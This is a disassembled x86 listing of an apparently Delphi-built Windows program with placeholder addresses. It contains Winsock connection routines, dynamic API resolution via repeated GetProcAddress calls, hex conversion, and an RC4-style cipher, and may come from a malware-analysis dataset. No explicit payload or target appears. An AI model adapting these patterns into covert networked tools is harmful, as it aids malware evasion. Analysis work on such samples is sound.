mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx ]
call sub_45fa8c
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fabc
mov edi eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fb74
mov esi eax
movzx eax [ ebp + 0x8 ]
dec al
je r-xdata
mov edx 0x5
mov eax esi
call sub_45fbf4
jmp r-xdata
dec al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov edx [ ebx ]
xor ecx ecx
mov eax esi
call sub_45fc10
test eax eax
sete [ ebp - 0x9 ]
mov eax esi
call sub_404650
mov eax [ ebx ]
call sub_404650
mov [ ebx ] edi
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx 0x6
mov eax esi
call sub_45fbf4
jmp r-xdata
dec al
je r-xdata
mov edx 0x7
mov eax esi
call sub_45fbf4
jmp r-xdata
sub_45fe8c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
xor ecx ecx
push ebp
push sub_45ff6c
push [ fs : ecx ]
mov [ fs : ecx ] esp
push edx
mov ecx eax
mov eax [ r-xdata ]
mov dl 0x1
call sub_45fb1c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45ff4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x3c ]
mov eax r-xdata
call sub_45fcf8
mov [ ebp - 0x2c ] 0x1
mov eax [ rw-data ]
mov esi eax
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] 0x1
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
push 0x0
mov ecx [ ebx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ae0
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_407024
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_45fa24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ff56
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub edx 0xffffffec
sub_45ff90
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460057
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fb1c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46003a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x8 ]
mov ecx edi
mov edx esi
call sub_45fddc
lea edx [ ebp - 0x1c ]
mov eax r-xdata
call sub_45fcf8
push 0x0
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ae0
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_407024
push 0x0
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_45fa24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460041
mov eax [ ebp - 0x8 ]
call sub_404650
retn
sub edx 0xffffffec
sub_460394
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x31 ] 0x0
xor eax eax
mov [ esi + 0x34 ] eax
xor eax eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x3e ] 0x0
mov [ esi + 0x40 ] 0xffffffff
mov [ esi + 0x44 ] 0x0
xor eax eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
xor eax eax
mov [ esi + 0x50 ] eax
mov [ esi + 0x54 ] eax
xor eax eax
mov [ esi + 0x58 ] eax
mov [ esi + 0x5c ] eax
xor eax eax
mov [ esi + 0x60 ] eax
mov [ esi + 0x64 ] eax
xor eax eax
mov [ esi + 0x68 ] eax
mov [ esi + 0x6c ] eax
call sub_40f490
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_460420
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_46044c
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop edx
pop esi
pop ebx
retn
movzx eax [ ebx + 0x3e ]
push eax
movzx eax [ ebx + 0x44 ]
mov eax [ eax * 4 + rw-data ]
push eax
movzx eax [ ebx + 0x3c ]
mov eax [ eax * 4 + rw-data ]
push eax
call socket
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov [ ebx + 0x40 ] esi
inc esi
setne al
mov [ ebx + 0x30 ] al
test al al
je r-xdata
cmp [ ebx + 0x31 ] 0x1
jne r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
xor eax eax
mov [ ebx + 0x38 ] eax
mov eax ebx
mov si 0xffef
call sub_40484c
mov [ esp ] 0x1
push esp
push 0x8004667e
mov eax [ ebx + 0x40 ]
push eax
call ioctlsocket
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4604d0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x40 ]
push eax
call closesocket
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ ebx + 0x40 ] 0xffffffff
mov [ ebx + 0x30 ] 0x0
mov eax ebx
mov si 0xffee
call sub_40484c
sub_460554
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov eax [ esi ]
add [ ebx + 0x34 ] eax
pop esi
pop ebx
retn
push esi
mov ecx edx
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_4605a4
push ebx
mov ebx eax
mov eax ebx
call sub_42042c
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x30 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_4605c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_460394
mov [ esi + 0x3c ] 0x2
mov [ esi + 0x3e ] 0x0
lea eax [ esi + 0x70 ]
call sub_405530
lea eax [ esi + 0x74 ]
call sub_405530
lea eax [ esi + 0x78 ]
call sub_405530
lea eax [ esi + 0x7c ]
call sub_405530
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_460628
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4606bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ esi ] 0x2
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4606cc
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call inet_addr
mov [ esi + 0x4 ] eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4607a4
push eax
call htons
mov [ esi + 0x2 ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4606c4
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0x8 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4606cc
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi ecx
mov ebx edx
mov eax esi
call sub_405530
test ebx ebx
je r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
movzx eax [ ebx ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax ebx
call sub_4059dc
push eax
call gethostbyname
test eax eax
je r-xdata
mov eax ebx
call sub_4059dc
push eax
call inet_addr
inc eax
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov ebx eax
push esi
mov eax [ ebx + 0xc ]
mov edi [ eax ]
movzx eax [ edi ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x0
movzx eax [ edi + 0x1 ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] 0x0
movzx eax [ edi + 0x2 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
movzx eax [ edi + 0x3 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x3
mov eax r-xdata
call sub_40af98
jmp r-xdata
mov eax esi
mov edx ebx
call sub_405584
jmp r-xdata
sub_4607a4
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push edi
mov eax ebx
call sub_4059dc
push eax
call getservbyname
test eax eax
je r-xdata
mov eax ebx
call sub_409edc
mov esi eax
movzx eax [ eax + 0x8 ]
push eax
call ntohs
mov esi eax
jmp r-xdata
sub_4607e0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov eax esi
call sub_405530
push 0x100
lea eax [ esp + 0x4 ]
push eax
call gethostname
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
test eax eax
jne r-xdata
add esp 0x100
pop esi
pop ebx
retn
mov eax esi
mov edx esp
mov ecx 0x100
call sub_4057a0
sub_460828
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46086d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4607e0
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_4606cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460874
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_46087c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4605c8
mov [ esi + 0x80 ] 0x0
xor eax eax
mov [ esi + 0x88 ] eax
mov [ esi + 0x8c ] eax
xor eax eax
mov [ esi + 0x90 ] eax
mov [ esi + 0x94 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4608d4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
mov eax esi
call sub_46044c
cmp [ esi + 0x30 ] 0x0
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ esi + 0x80 ] 0x0
jne r-xdata
push esp
mov ecx [ esi + 0x7c ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_460628
push 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x40 ]
push eax
call connect
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
test eax eax
sete bl
mov [ esi + 0x80 ] bl
test bl bl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
sub_460934
push ebx
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
je r-xdata
mov eax ebx
call sub_4604d0
pop ebx
retn
push 0x2
mov eax [ ebx + 0x40 ]
push eax
call shutdown
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ ebx + 0x80 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_460a1f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_460a4c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460a53
retn
call sub_4609ec
sub_460a58
push ebx
push esi
mov esi eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46087c
mov ebx eax
mov edx esi
mov eax ebx
call sub_460828
pop esi
pop ebx
retn
sub_460ac0
push ebx
mov ebx rw-data
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r-xdata
call GetModuleHandleA
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov al 0x1
pop ebx
retn
sub_460d3c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_460ac0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push esi
push ebx
call [ rw-data ]
pop esi
pop ebx
retn
sub_460d5c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_460ac0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push esi
push ebx
call [ rw-data ]
pop esi
pop ebx
retn
sub_460d7c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_460ac0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push esi
push ebx
call [ rw-data ]
pop esi
pop ebx
retn
sub_460d9c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_460ac0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push esi
push ebx
call [ rw-data ]
pop esi
pop ebx
retn
sub_460dbc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_460ac0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push esi
push ebx
call [ rw-data ]
pop esi
pop ebx
retn
sub_460ddc
push ebx
mov ebx rw-data
cmp [ ebx ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x20
jae r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
mov [ ebx ] eax
xor eax eax
pop ebx
retn
sub_461148
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
call sub_460ddc
test al al
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
push ebx
call [ rw-data ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_461178
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
call sub_460ddc
test al al
je r-xdata
xor eax eax
push edi
push esi
push ebx
call [ rw-data ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4611cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46123d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461244
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov edi 0x1
mov eax [ ebp - 0x4 ]
movzx eax [ eax + edi - 0x1 ]
lea ecx [ ebp - 0x8 ]
mov edx 0x2
call sub_409e84
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405818
inc edi
dec ebx
jne r-xdata
sub_46124c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4613ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax edx
test eax eax
je r-xdata
and eax 0x80000001
jns r-xdata
sub eax 0x4
mov eax [ eax ]
test eax eax
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4613d1
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax edx
test eax eax
je r-xdata
mov edx eax
sar edx 0x1
jns r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax esi
call sub_405c6c
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
adc edx 0x0
mov edi eax
test edi edi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov ebx 0x1
mov eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
movzx eax [ edx + eax - 0x2 ]
add al 0xbf
sub al 0x6
jae r-xdata
mov eax esi
call j_sub_4059f0
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + edx - 0x2 ]
sub dl 0x30
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
mov eax esi
call j_sub_4059f0
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + edx - 0x2 ]
sub dl 0x41
add dl 0xa
mov [ eax + ebx - 0x1 ] dl
mov eax esi
call j_sub_4059f0
mov edx [ esi ]
movzx edx [ edx + ebx - 0x1 ]
shl edx 0x4
mov [ eax + ebx - 0x1 ] dl
mov eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
movzx eax [ edx + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
movzx eax [ edx + eax - 0x1 ]
add al 0xbf
sub al 0x6
jae r-xdata
mov eax esi
call j_sub_4059f0
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + edx - 0x1 ]
mov ecx [ esi ]
add dl [ ecx + ebx - 0x1 ]
sub dl 0x30
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
mov eax esi
call j_sub_4059f0
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
movzx edx [ ecx + edx - 0x1 ]
mov ecx [ esi ]
add dl [ ecx + ebx - 0x1 ]
sub dl 0x41
add dl 0xa
mov [ eax + ebx - 0x1 ] dl
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
movzx eax [ edx + eax - 0x2 ]
add al 0xd0
sub al 0xa
jae r-xdata
sub_4613d8
push ebp
mov ebp esp
add esp 0xfffffbe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x420 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4616a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax edx
test eax eax
je r-xdata
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4616ac
lea eax [ ebp - 0x420 ]
call sub_405530
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4060f8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax edx
test eax eax
je r-xdata
cmp eax 0x100
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov ebx edx
test ebx ebx
je r-xdata
push 0x100
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
lea eax [ ebp - 0x8 ]
call j_sub_4059f0
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx 0x100
call sub_4611c4
jmp r-xdata
push ebx
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor esi esi
lea eax [ ebp - 0x41c ]
lea eax [ ebp - 0x8 ]
call j_sub_4059f0
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx ebx
call sub_4611c4
sub ebx 0x4
mov ebx [ ebx ]
mov [ eax ] esi
inc esi
add eax 0x4
cmp esi 0x100
jne r-xdata
xor ebx ebx
xor esi esi
lea ecx [ ebp - 0x41c ]
mov eax esi
cdq
idiv edi
mov eax [ ebp - 0xc ]
movzx eax [ eax + edx ]
add ebx [ ecx ]
add eax ebx
and eax 0x800000ff
jns r-xdata
sub edi 0x4
mov edi [ edi ]
mov ebx eax
movzx eax [ ecx ]
mov [ ebp - 0x15 ] al
mov eax [ ebp + ebx * 4 - 0x41c ]
mov [ ecx ] eax
movzx eax [ ebp - 0x15 ]
mov [ ebp + ebx * 4 - 0x41c ] eax
inc esi
add ecx 0x4
cmp esi 0x100
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
mov edi [ ebp - 0x8 ]
test edi edi
je r-xdata
xor ebx ebx
xor edi edi
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
push esi
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
call j_sub_4059f0
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx esi
call sub_4611c4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
dec eax
test eax eax
jl r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov [ ebp - 0x1c ] eax
xor esi esi
mov edx [ ebp - 0x14 ]
xchg edx eax
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
add edi [ ebp + ebx * 4 - 0x41c ]
and edi 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
mov eax [ ebp - 0x14 ]
call j_sub_4059f0
mov edx [ ebp - 0x10 ]
mov ecx ebx
call sub_4611c4
lea edx [ ebp - 0x420 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4611cc
mov edx [ ebp - 0x420 ]
mov eax [ ebp - 0x14 ]
call sub_405584
sub ebx 0x4
mov ebx [ ebx ]
movzx eax [ ebp + ebx * 4 - 0x41c ]
mov [ ebp - 0x15 ] al
mov eax [ ebp + edi * 4 - 0x41c ]
mov [ ebp + ebx * 4 - 0x41c ] eax
movzx eax [ ebp - 0x15 ]
mov [ ebp + edi * 4 - 0x41c ] eax
mov eax [ ebp + ebx * 4 - 0x41c ]
add eax [ ebp + edi * 4 - 0x41c ]
and eax 0x800000ff
jns r-xdata
dec edi
or edi 0xffffff00
inc edi
movzx eax [ ebp + eax * 4 - 0x41c ]
mov edx [ ebp - 0x10 ]
xor [ edx + esi ] al
inc esi
dec [ ebp - 0x1c ]
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
inc ebx
and ebx 0x800000ff
jns r-xdata
sub_4616b4
push ebp
mov ebp esp
add esp 0xfffffbe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x420 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_461980
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461987
lea eax [ ebp - 0x420 ]
call sub_405530
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4060f8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x420 ]
mov eax [ ebp - 0x4 ]
call sub_46124c
mov edx [ ebp - 0x420 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
mov edx [ ebp - 0x8 ]
mov eax edx
test eax eax
je r-xdata
cmp eax 0x100
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov ebx edx
test ebx ebx
je r-xdata
push 0x100
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
lea eax [ ebp - 0x8 ]
call j_sub_4059f0
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx 0x100
call sub_4611c4
jmp r-xdata
push ebx
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov ebx [ ebp - 0x8 ]
test ebx ebx
